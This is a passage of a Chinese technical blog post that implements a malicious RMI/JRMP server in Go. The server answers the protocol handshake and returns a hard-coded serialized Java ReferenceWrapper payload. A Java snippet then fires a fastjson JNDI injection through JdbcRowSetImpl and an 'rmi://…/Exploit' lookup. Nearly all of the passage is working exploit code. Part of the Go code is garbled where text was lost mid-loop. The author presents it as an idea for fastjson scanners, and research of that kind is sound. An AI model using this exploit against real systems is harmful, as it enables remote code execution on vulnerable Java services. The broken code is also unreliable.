        // 检测第一个请求是否合法
        if !firstCheck(data) {
            return
        }
        // 发送IP信息的响应
        ret := getFirstResp(conn)
        _, err := (*conn).Write(ret)
        fmt.Println("server->client:address info")
        if err != nil {
            panic(err)
        }
        data = make([]byte, 1024)
        // 读取第二个请求
        _, _ = (*conn).Read(data)
        fmt.Println("client->server:unicast info")
        // 解析第二个请求
        handleSecond(data, conn)
    }
firstCheck内容，根据协议判断每一位是否合法
    func firstCheck(data []byte) bool {
        // check head
        if data[0] == 0x4a &&
            data[1] == 0x52 &&
            data[2] == 0x4d &&
            data[3] == 0x49 {
            // check version
            if data[4] != 0x00 &&
                data[4] != 0x01 {
                return false
            }
            // check protocol
            if data[6] != 0x4b &&
                data[6] != 0x4c &&
                data[6] != 0x4d {
                return false
            }
            // check other data
            lastData := data[7:]
            for _, v := range lastData {
                if v != 0x00 {
                    return false
                }
            }
            return true
        }
        return false
    }
getFirstResp，构造第一个响应包
    func getFirstResp(conn *net.Conn) []byte {
        var ret []byte
        address := (*conn).RemoteAddr().String()
        ip := strings.Split(address, ":")[0]
        port := strings.Split(address, ":")[1]
        length := len(ip)
        // flag位
        ret = append(ret, 0x4e)
        // length位
        ret = append(ret, 0x00)
        ret = append(ret, uint8(length))
        // 写入ip
        for _, v := range ip {
            ret = append(ret, uint8(v))
        }
        // 空余
        ret = append(ret, 0x00)
        ret = append(ret, 0x00)
        intPort, _ := strconv.Atoi(port)
        temp := uint16(intPort)
        var b [2]byte
        // 写入端口
        b[1] = uint8(temp)
        b[0] = uint8(temp >> 8)
        ret = append(ret, b[0])
        ret = append(ret, b[1])
        return ret
    }
第二个包处理，由于单播地址不确定，所以给出ipv4的正则
    func handleSecond(data []byte, conn *net.Conn) {
        if data[0] != 0x00 {
            return
        }
        length := data[1]
        var ip string
        for i := 2; i server:exploit")
        data := make([]byte, 1024)
        _, _ = (*conn).Read(data)
        payload := []byte{
            0x51, 0xac, 0xed, 0x00, 0x05, 0x77, 0x0f, 0x01, 0xc6, 0xee, 0x4f, 0x24, 0x00, 0x00, 0x01, 0x7b, 0x11, 0x5d, 0xc6,
            0xff, 0x80, 0x08, 0x73, 0x72, 0x00, 0x2f, 0x63, 0x6f, 0x6d, 0x2e, 0x73, 0x75, 0x6e, 0x2e, 0x6a, 0x6e, 0x64, 0x69,
            0x2e, 0x72, 0x6d, 0x69, 0x2e, 0x72, 0x65, 0x67, 0x69, 0x73, 0x74, 0x72, 0x79, 0x2e, 0x52, 0x65, 0x66, 0x65, 0x72,
            0x65, 0x6e, 0x63, 0x65, 0x57, 0x72, 0x61, 0x70, 0x70, 0x65, 0x72, 0x5f, 0x53, 0x74, 0x75, 0x62, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x02, 0x02, 0x00, 0x00, 0x70, 0x78, 0x72, 0x00, 0x1a, 0x6a, 0x61, 0x76, 0x61, 0x2e, 0x72,
            0x6d, 0x69, 0x2e, 0x73, 0x65, 0x72, 0x76, 0x65, 0x72, 0x2e, 0x52, 0x65, 0x6d, 0x6f, 0x74, 0x65, 0x53, 0x74, 0x75,
            0x62, 0xe9, 0xfe, 0xdc, 0xc9, 0x8b, 0xe1, 0x65, 0x1a, 0x02, 0x00, 0x00, 0x70, 0x78, 0x72, 0x00, 0x1c, 0x6a, 0x61,
            0x76, 0x61, 0x2e, 0x72, 0x6d, 0x69, 0x2e, 0x73, 0x65, 0x72, 0x76, 0x65, 0x72, 0x2e, 0x52, 0x65, 0x6d, 0x6f, 0x74,
            0x65, 0x4f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0xd3, 0x61, 0xb4, 0x91, 0x0c, 0x61, 0x33, 0x1e, 0x03, 0x00, 0x00, 0x70,
            0x78, 0x70, 0x77, 0x36, 0x00, 0x0a, 0x55, 0x6e, 0x69, 0x63, 0x61, 0x73, 0x74, 0x52, 0x65, 0x66, 0x00, 0x0d, 0x31,
            0x39, 0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e, 0x32, 0x32, 0x32, 0x2e, 0x31, 0x00, 0x00, 0xf3, 0xbd, 0x23, 0x92, 0xb3,
            0xd9, 0xf7, 0xa3, 0x45, 0x9c, 0xc6, 0xee, 0x4f, 0x24, 0x00, 0x00, 0x01, 0x7b, 0x11, 0x5d, 0xc6, 0xff, 0x80, 0x01,
            0x01, 0x78,
        }
        _, _ = (*conn).Write(payload)
        data = make([]byte, 1024)
        _, _ = (*conn).Read(data)
        if data[0] == 0x52 {
            lastData := data[1:]
            for _, v := range lastData {
                if v != 0x00 {
                    return
                }
            }
            doFinal(conn)
        }
    }
最后两步的Ping和Ack，DgcAck无法确认后续内容，只对第一位进行校验
    func doFinal(conn *net.Conn) {
        _, _ = (*conn).Write([]byte{0x53})
        data := make([]byte, 1024)
        _, _ = (*conn).Read(data)
        if data[0] == 0x54 {
            fmt.Println("final")
        }
    }
最终触发Payload
    public static void main(String[] argv) throws Exception {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
            "\"dataSourceName\":\"rmi://127.0.0.1:8888/Exploit\", " +
            "\"autoCommit\":true}";
        JSON.parse(payload);
    }
效果如图，成功用golang实现RMI协议的解析，代码有很多不完善，但是提供了一种思路，也许各大厂商可以将该思路加入自己的fastjson扫描组件中
## 参考链接